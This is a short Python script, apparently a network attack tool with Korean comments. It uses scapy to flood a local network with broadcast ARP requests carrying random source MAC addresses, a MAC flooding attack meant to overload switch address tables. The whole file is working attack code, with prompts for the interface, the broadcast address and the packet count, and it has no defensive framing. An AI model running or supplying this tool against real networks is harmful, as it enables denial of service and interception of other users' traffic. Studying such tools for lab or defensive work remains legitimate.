#-*- coding: utf-8 -*-
import socket
from scapy.all import *

def macFlood(interface, broadcastAddress, packetCount):
    arp=ARP(pdst=broadcastAddress, hwdst="ff:ff:ff:ff:ff:ff") # 브로드캐스트(목적지)
    eth=Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff") # 랜덤한 맥어드레스(출발지), 브로드캐스트(목적지)
    try:
        sendp(eth/arp, iface=interface,count=packetCount, inter= .001) # ARP Request 를 브로드캐스팅
    except : 
        print "Destination Unreachable "

def main():
    interface=raw_input("Input Interface : ")
    broadcastAddress=raw_input("Input Broadcast Address : ")
    packetCount=int(raw_input("Input Packet Count : "))
    macFlood(interface, broadcastAddress, packetCount)

if __name__=="__main__":
    main()
